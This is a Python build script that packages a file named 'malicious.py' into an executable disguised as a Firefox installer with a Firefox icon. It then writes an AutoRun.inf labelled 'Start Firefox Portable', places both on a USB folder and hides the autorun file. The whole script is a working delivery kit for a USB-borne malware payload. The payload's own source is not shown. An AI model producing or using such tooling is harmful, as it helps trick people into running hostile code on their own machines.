# import
import PyInstaller.__main__
import shutil
import os

# global vars
filename = "malicious.py"
exe_name = "firefox_installer_1.44.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

if os.path.exists(exe_name):
    os.remove(exe_name)

if __name__ == "__main__":

    print("Creating EXE")
    PyInstaller.__main__.run([
        "malicious.py",
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        "--name=" + exe_name,
        "--icon=" + icon,
    ])
    print("EXE Created")

    # PyInstaller clean-up
    shutil.move(os.path.join(pwd, "dist", exe_name), pwd)
    shutil.rmtree("dist")
    shutil.rmtree("build")
    shutil.rmtree("__pycache__")
    os.remove(exe_name + ".spec")

    print("Creating AutoRun File")
    with open("AutoRun.inf", "w") as f:
        f.write("{AutoRun}\n")
        f.write("Open=" + exe_name+"\n")
        f.write("Action=Start Firefox Portable\n")
        f.write("Label=MY USB\n")
        f.write("Icon=" + exe_name+"\n")
    print("Setting up USB")

    shutil.move(exe_name, usbdir)
    shutil.move("AutoRun.inf", usbdir)
    print("attrib +h " + os.path.join(usbdir,"AutoRun.inf"))
    os.system("attrib +h " + os.path.join(usbdir,"AutoRun.inf"))
